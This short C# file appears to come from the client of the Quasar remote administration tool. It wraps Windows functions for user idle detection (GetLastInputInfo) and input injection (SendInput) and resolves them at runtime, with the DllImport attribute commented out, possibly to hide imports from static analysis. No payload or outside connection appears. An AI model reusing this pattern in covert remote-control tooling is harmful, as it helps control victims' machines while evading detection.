using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static partial class ClientNatives
    {
        //[DllImport("user32.dll")]
        internal delegate bool GetLastInputInfoFunc(ref LASTINPUTINFO plii);
        internal static bool GetLastInputInfo(ref LASTINPUTINFO plii) => Lookup<GetLastInputInfoFunc>("user32.dll", "GetLastInputInfo")(ref plii);

        internal delegate uint SendInputFunc(uint nInputs, [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs, int cbSize);
        internal static uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize) => Lookup<SendInputFunc>("user32.dll", "SendInput")(nInputs, pInputs, cbSize);
    }
}
